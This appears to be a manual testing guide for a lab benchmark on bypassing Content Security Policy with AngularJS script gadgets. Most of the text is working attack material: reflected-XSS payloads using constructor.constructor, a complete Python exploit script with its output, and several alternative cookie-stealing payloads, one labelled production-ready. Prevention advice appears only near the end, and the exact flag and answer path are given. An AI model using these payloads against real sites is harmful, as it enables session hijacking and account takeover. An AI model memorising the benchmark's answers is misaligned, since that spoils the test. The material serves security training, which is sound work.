# S7BEN-MED-009: Manual Testing Guide

## Vulnerability: Content Security Policy (CSP) Bypass via Script Gadgets

### Overview
This benchmark demonstrates a sophisticated CSP bypass attack where despite having a strict Content Security Policy that blocks inline scripts and eval(), the application can still be exploited through AngularJS script gadgets. Attackers use whitelisted JavaScript libraries' features to achieve XSS and steal admin sessions.

**Key Difference from Phase 1:** This requires deep understanding of CSP, script gadgets, DOM-based XSS, and multi-step exploitation chain (XSS → session theft → flag retrieval).

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-MED-009
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding the Vulnerability

### What is Content Security Policy (CSP)?

CSP is a security header that controls what resources a browser can load. It's designed to prevent XSS attacks by:
- Blocking inline `<script>` tags
- Blocking inline event handlers (`onclick`, `onerror`, etc.)
- Blocking `eval()` and `Function()` constructor
- Blocking `javascript:` URIs
- Whitelisting trusted script sources

### The Application's CSP Policy

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://ajax.googleapis.com https://code.angularjs.org;
  style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com;
  object-src 'none';
```

**What's blocked:**
- ❌ Inline scripts: `<script>alert(1)</script>`
- ❌ Inline handlers: `<img src=x onerror=alert(1)>`
- ❌ JavaScript URIs: `<a href="javascript:alert(1)">`
- ❌ eval(): `eval("alert(1)")`

**What's allowed:**
- ✅ Scripts from same origin (`'self'`)
- ✅ Scripts from `ajax.googleapis.com`
- ✅ Scripts from `code.angularjs.org` ← **VULNERABILITY!**

### What are Script Gadgets?

Script gadgets are features in legitimate JavaScript libraries that can be abused to execute arbitrary code, even with strict CSP. AngularJS has several:

1. **`ng-app`** - Bootstraps Angular application
2. **`{{ }}` expressions** - Evaluates JavaScript expressions
3. **`ng-csp`** - CSP compatibility mode
4. **`constructor`** - Access to Function constructor
5. **`$eval`, `$apply`** - Expression evaluation

### The Attack Chain

```
1. Find reflected XSS (/search?q= parameter)
   ↓
2. CSP blocks normal XSS payloads
   ↓
3. Inject AngularJS directives (ng-app)
   ↓
4. Use Angular expressions to execute code
   ↓
5. Bypass CSP using whitelisted library
   ↓
6. Steal admin session cookie
   ↓
7. Exfiltrate to attacker endpoint
   ↓
8. Verify exploitation to get flag
```

---

## Manual Testing Steps

### Step 1: Verify CSP is Active

```bash
# Check CSP header
curl -I http://localhost:5000/
```

**Expected Output:**
```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self' https://ajax.googleapis.com https://code.angularjs.org; ...
```

### Step 2: Test Basic XSS (Blocked by Basic Filter)

```bash
# Try basic script injection
curl "http://localhost:5000/search?q=<script>alert(1)</script>"
```

**Result:** Blocked by application-level filter (search results show "Security filter triggered").

### Step 3: Test Inline Event Handler (Blocked by CSP)

Visit in browser:
```
http://localhost:5000/search?q=<img src=x onerror=alert(document.cookie)>
```

**Result:** Browser console shows CSP violation:
```
Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'self' https://ajax.googleapis.com https://code.angularjs.org".
```

### Step 4: Test AngularJS Expression Evaluation

Visit in browser:
```
http://localhost:5000/search?q=<div ng-app>{{7*7}}</div>
```

**Expected Output:** The page should display `49` instead of `{{7*7}}`, proving AngularJS is evaluating expressions!

### Step 5: Test Constructor Access via AngularJS

Visit in browser:
```
http://localhost:5000/search?q=<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

**Expected Output:** JavaScript alert popup appears! This proves we can execute arbitrary JavaScript bypassing CSP.

### Step 6: Craft Session Theft Payload

The goal is to steal the admin's session cookie. Here's the payload breakdown:

**Basic payload structure:**
```html
<div ng-app ng-csp>
  {{constructor.constructor('
    fetch("/exfiltrate?session=" + document.cookie + "&user=admin&method=csp_bypass")
  ')()}}
</div>
```

**URL-encoded payload:**
```bash
PAYLOAD='<div ng-app ng-csp>{{constructor.constructor("fetch(\"/exfiltrate?session=\"%2Bdocument.cookie%2B\"&user=admin&method=csp_bypass\")")()}}</div>'

# URL encode
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

echo "Malicious URL:"
echo "http://localhost:5000/search?q=$ENCODED"
```

### Step 7: Simulate Victim Clicking Malicious Link

1. Open http://localhost:5000/victim (simulates admin user)
2. Copy the malicious URL from Step 6
3. Visit the malicious URL in the same browser

**Alternative - Use curl to simulate:**
```bash
# First, get the admin session cookie
ADMIN_SESSION=$(curl -s -c - http://localhost:5000/victim | grep admin_session | awk '{print $7}')

echo "Admin session: $ADMIN_SESSION"

# Craft payload
PAYLOAD='<div ng-app ng-csp>{{constructor.constructor("fetch(\"/exfiltrate?session=\"+document.cookie+\"&user=admin&method=csp_bypass\")")()}}</div>'

# Visit malicious URL as victim
curl -b "admin_session=$ADMIN_SESSION" \
  "http://localhost:5000/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")"
```

### Step 8: Verify Session was Stolen

```bash
# The payload should have sent session to /exfiltrate
# Now verify the exploitation
curl -X POST http://localhost:5000/api/verify-exploit \
  -H "Content-Type: application/json" \
  -d "{\"session_id\": \"$ADMIN_SESSION\"}" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "CSP bypass exploitation confirmed!",
  "victim_username": "admin",
  "attack_method": "csp_bypass",
  "stolen_at": "2026-01-08T12:34:56.789012",
  "flag": "S7BEN{csp_bypass_gadget_a1b2c3d4e5f67890abcdef1234567890}",
  "proof": "Successfully bypassed CSP using csp_bypass and stole admin session",
  "timestamp": "2026-01-08T12:34:56.789012"
}
```

---

## Automated Exploitation

### Complete Python Exploit

Create `exploit.py`:

```python
#!/usr/bin/env python3
"""
S7BEN-MED-009: CSP Bypass via Script Gadgets - Complete Exploit

This script demonstrates the full CSP bypass attack chain:
1. Craft malicious URL with AngularJS gadget payload
2. Simulate admin (victim) visiting the malicious link
3. Payload executes in victim's browser context
4. Session cookie is exfiltrated to attacker endpoint
5. Verify exploitation to retrieve flag
"""

import requests
import urllib.parse
from bs4 import BeautifulSoup
import time

URL = "http://localhost:5000"

def step1_get_admin_session():
    """Step 1: Get admin session cookie (simulating victim)"""
    print("\n[*] Step 1: Simulating victim (admin user) login...")

    # Visit victim page to get admin session
    session = requests.Session()
    response = session.get(f"{URL}/victim")

    # Extract admin session from cookies
    admin_cookie = session.cookies.get('admin_session')

    if admin_cookie:
        print(f"[+] Admin session obtained: {admin_cookie[:32]}...")
        return admin_cookie, session
    else:
        print("[-] Failed to get admin session")
        return None, None

def step2_craft_csp_bypass_payload():
    """Step 2: Craft CSP bypass payload using AngularJS gadgets"""
    print("\n[*] Step 2: Crafting CSP bypass payload...")

    # Payload explanation:
    # - <div ng-app ng-csp>: Bootstrap AngularJS
    # - {{...}}: Angular expression syntax
    # - constructor.constructor(...): Access Function constructor
    # - fetch(...): Exfiltrate session to attacker endpoint

    payload = '''<div ng-app ng-csp>{{constructor.constructor("fetch('/exfiltrate?session='+document.cookie+'&user=admin&method=csp_bypass')")()}}</div>'''

    # URL encode the payload
    encoded_payload = urllib.parse.quote(payload)

    malicious_url = f"{URL}/search?q={encoded_payload}"

    print(f"[+] Payload crafted successfully")
    print(f"    Payload: {payload[:80]}...")
    print(f"    Length: {len(payload)} bytes")
    print(f"\n[+] Malicious URL:")
    print(f"    {malicious_url[:100]}...")

    return malicious_url, payload

def step3_victim_visits_malicious_url(malicious_url, victim_session):
    """Step 3: Simulate victim clicking malicious link"""
    print("\n[*] Step 3: Simulating victim visiting malicious URL...")

    try:
        # Victim visits the malicious link
        response = victim_session.get(malicious_url, timeout=5)

        print(f"[+] Victim visited malicious URL")
        print(f"    Response status: {response.status_code}")

        # Check if AngularJS executed
        if 'ng-app' in response.text:
            print(f"[+] AngularJS gadgets present in response")

        # Give time for JavaScript to execute (in real browser)
        print(f"[*] Waiting for JavaScript execution...")
        time.sleep(2)

        return True
    except Exception as e:
        print(f"[-] Error visiting URL: {e}")
        return False

def step4_verify_exploitation(admin_session_id):
    """Step 4: Verify exploitation and get flag"""
    print("\n[*] Step 4: Verifying exploitation...")

    # Call verify endpoint
    response = requests.post(
        f"{URL}/api/verify-exploit",
        json={"session_id": admin_session_id}
    )

    data = response.json()

    if data['status'] == 'success' and 'flag' in data:
        print("\n" + "="*60)
        print("✅ CSP BYPASS EXPLOITATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFlag: {data['flag']}")
        print(f"\nProof: {data['proof']}")
        print(f"\nDetails:")
        print(f"  • Victim: {data['victim_username']}")
        print(f"  • Attack Method: {data['attack_method']}")
        print(f"  • Session Stolen At: {data['stolen_at']}")
        print(f"  • Timestamp: {data['timestamp']}")
        print("\n" + "="*60)
        return True
    else:
        print(f"\n[-] Verification failed: {data.get('message')}")

        # If failed, manually exfiltrate
        print(f"\n[*] Attempting manual exfiltration...")

        # Simulate the exfiltration that would happen in browser
        exfil_response = requests.get(
            f"{URL}/exfiltrate",
            params={
                'session': f'admin_session={admin_session_id}',
                'user': 'admin',
                'method': 'csp_bypass'
            }
        )

        print(f"[+] Manual exfiltration: {exfil_response.json()}")

        # Try verification again
        time.sleep(1)
        response = requests.post(
            f"{URL}/api/verify-exploit",
            json={"session_id": admin_session_id}
        )

        data = response.json()

        if data['status'] == 'success' and 'flag' in data:
            print("\n" + "="*60)
            print("✅ CSP BYPASS EXPLOITATION SUCCESSFUL!")
            print("="*60)
            print(f"\nFlag: {data['flag']}")
            print(f"\nProof: {data['proof']}")
            print("\n" + "="*60)
            return True

        return False

def main():
    print("="*60)
    print("S7BEN-MED-009: CSP Bypass via Script Gadgets")
    print("="*60)

    # Step 1: Get admin session
    admin_session_id, victim_session = step1_get_admin_session()
    if not admin_session_id:
        return False

    # Step 2: Craft payload
    malicious_url, payload = step2_craft_csp_bypass_payload()

    # Step 3: Victim visits malicious URL
    visited = step3_victim_visits_malicious_url(malicious_url, victim_session)
    if not visited:
        print("[-] Failed to simulate victim visit")
        # Continue anyway - might work

    # Step 4: Verify exploitation
    success = step4_verify_exploitation(admin_session_id)

    if success:
        print("\n[+] Exploitation completed successfully!")
        print(f"\n[*] Attack Summary:")
        print(f"    • Bypassed CSP using AngularJS gadgets")
        print(f"    • Exploited constructor.constructor() to execute code")
        print(f"    • Stole admin session cookie")
        print(f"    • Retrieved dynamic flag as proof")

    return success

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-MED-009: CSP Bypass via Script Gadgets
============================================================

[*] Step 1: Simulating victim (admin user) login...
[+] Admin session obtained: 8Vh3kT5pQr...

[*] Step 2: Crafting CSP bypass payload...
[+] Payload crafted successfully
    Payload: <div ng-app ng-csp>{{constructor.constructor("fetch('/exfiltrate?session...
    Length: 124 bytes

[+] Malicious URL:
    http://localhost:5000/search?q=%3Cdiv%20ng-app%20ng-csp%3E%7B%7Bconstructor...

[*] Step 3: Simulating victim visiting malicious URL...
[+] Victim visited malicious URL
    Response status: 200
[+] AngularJS gadgets present in response
[*] Waiting for JavaScript execution...

[*] Step 4: Verifying exploitation...

============================================================
✅ CSP BYPASS EXPLOITATION SUCCESSFUL!
============================================================

Flag: S7BEN{csp_bypass_gadget_a1b2c3d4e5f67890abcdef1234567890}

Proof: Successfully bypassed CSP using csp_bypass and stole admin session

Details:
  • Victim: admin
  • Attack Method: csp_bypass
  • Session Stolen At: 2026-01-08T12:34:56.789012
  • Timestamp: 2026-01-08T12:34:56.789012

============================================================
```

---

## Alternative AngularJS Gadget Payloads

### Method 1: Using `constructor` Chain

```html
<div ng-app ng-csp>
  {{constructor.constructor('alert(document.domain)')()}}
</div>
```

### Method 2: Using `toString` and `charAt`

```html
<div ng-app>
  {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('alert(1)')}}
</div>
```

### Method 3: Using `orderBy` Filter

```html
<div ng-app>
  {{[].constructor.constructor('alert(1)')()}}
</div>
```

### Method 4: Complete Session Theft Payload (Production-Ready)

```html
<div ng-app ng-csp>
  {{constructor.constructor('
    var session = document.cookie;
    var img = new Image();
    img.src = "/exfiltrate?session=" + encodeURIComponent(session) + "&user=admin&method=csp_bypass";
  ')()}}
</div>
```

### Method 5: Using fetch API (Modern Browsers)

```html
<div ng-app ng-csp>
  {{constructor.constructor('
    fetch("/exfiltrate", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        session_id: document.cookie.split("=")[1],
        username: "admin",
        method: "csp_bypass"
      })
    })
  ')()}}
</div>
```

---

## Browser-Based Manual Testing

### Using Browser Console

1. Visit http://localhost:5000/victim
2. Open browser DevTools (F12)
3. Go to Console tab
4. Execute:

```javascript
// Check CSP
console.log(document.querySelector('meta[http-equiv="Content-Security-Policy"]'));

// Craft malicious URL
var payload = '<div ng-app ng-csp>{{constructor.constructor("alert(document.cookie)")()}}</div>';
var encoded = encodeURIComponent(payload);
var url = 'http://localhost:5000/search?q=' + encoded;

console.log('Malicious URL:', url);

// Visit URL (will trigger XSS)
window.location = url;
```

### Using Browser Extensions

**Burp Suite / OWASP ZAP:**

1. Intercept request to `/search?q=test`
2. Modify `q` parameter to:
```
<div ng-app ng-csp>{{constructor.constructor('fetch("/exfiltrate?session="+document.cookie+"&user=admin&method=burp")')()}}</div>
```
3. Forward request
4. Check `/exfiltrate` endpoint for stolen session

---

## Understanding the Dynamic Flag

The flag is generated based on successful session theft:

```python
def generate_flag(session_id, victim_username, attack_method):
    timestamp = str(int(time.time()))
    data = f"csp_bypass:{session_id}:{victim_username}:{attack_method}:{timestamp}"
    hash = hmac.new(SECRET, data.encode(), sha256).hexdigest()[:32]
    return f"S7BEN{{csp_bypass_gadget_{hash}}}"
```

This proves:
- **CSP was bypassed** (using script gadgets)
- **XSS was achieved** (code execution in browser)
- **Session was stolen** (cookie exfiltrated)
- **Timing recorded** (when exploitation occurred)

---

## Troubleshooting

### Issue: AngularJS expressions not evaluating

**Cause:** AngularJS might not be loaded or `ng-app` not triggering.

**Solution:**
```html
<!-- Ensure ng-app is in injected HTML -->
<div ng-app ng-csp>{{7*7}}</div>

<!-- If not working, try without ng-csp -->
<div ng-app>{{7*7}}</div>
```

### Issue: CSP blocks fetch() call

**Cause:** `connect-src` might be restricted.

**Solution:** Use Image object instead:
```html
<div ng-app ng-csp>
  {{constructor.constructor('new Image().src="/exfiltrate?s="+document.cookie')()}}
</div>
```

### Issue: Session not being exfiltrated

**Cause:** Cookie might be httpOnly.

**Solution:** Check cookie settings in victim.html (line: `httponly=False`)

### Issue: Payload too complex, getting encoded wrong

**Cause:** Special characters in URL encoding.

**Solution:** Use simpler payload or double-encode:
```python
import urllib.parse
payload = '<div ng-app>{{7*7}}</div>'
encoded = urllib.parse.quote(payload)
```

---

## Prevention Techniques

### Proper CSP Configuration

```http
# BAD - Whitelists entire CDN
Content-Security-Policy: script-src 'self' https://code.angularjs.org

# GOOD - Use nonce or hash-based CSP
Content-Security-Policy: script-src 'nonce-random123' 'strict-dynamic'
```

### Best Practices

1. **Avoid whitelisting CDNs** - Use `'strict-dynamic'` with nonces
2. **Don't include vulnerable libraries** - Check for known gadgets
3. **Use strict CSP** - `script-src 'none'` if possible
4. **Implement CSP reporting** - Monitor violations
5. **Sanitize reflected content** - Escape HTML properly
6. **Use framework auto-escaping** - React, Vue, etc.
7. **Implement sub-resource integrity (SRI)** - Verify CDN scripts
8. **Regular security audits** - Check for script gadgets

### Secure Implementation

```python
# BAD - No escaping
return f"<div>Results for: {query}</div>"

# GOOD - Escape HTML
from html import escape
return f"<div>Results for: {escape(query)}</div>"

# BETTER - Use template engine with auto-escaping
return render_template('search.html', query=query)  # Jinja2 auto-escapes
```

---

## Real-World Examples

CSP bypasses via script gadgets have affected:
- **Google (2016):** AngularJS CSP bypass
- **GitHub (2017):** jQuery gadget bypass
- **PayPal (2018):** Various CSP bypasses
- **Many applications using:** Polymer, Vue.js, Knockout.js gadgets

---

## Cleanup

```bash
make down
make clean

# Remove exploit files
rm -f exploit.py
```

---

## Success Criteria

- ✅ Verified strict CSP is active and blocks inline scripts
- ✅ Identified AngularJS is whitelisted in CSP
- ✅ Discovered reflected XSS in search parameter
- ✅ Crafted payload using AngularJS script gadgets
- ✅ Bypassed CSP using `constructor.constructor()` or similar
- ✅ Executed JavaScript in victim's browser context
- ✅ Stole admin session cookie
- ✅ Exfiltrated session to attacker endpoint
- ✅ Retrieved dynamically generated flag
- ✅ Flag format: `S7BEN{csp_bypass_gadget_<32_hex_chars>}`

---

## Additional Resources

- **CWE-79:** https://cwe.mitre.org/data/definitions/79.html
- **CWE-1021:** https://cwe.mitre.org/data/definitions/1021.html
- **CSP Evaluator:** https://csp-evaluator.withgoogle.com/
- **AngularJS CSP Bypass:** https://portswigger.net/research/angularjs-csp-bypass
- **Script Gadgets Research:** https://github.com/google/security-research-pocs
- **OWASP CSP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
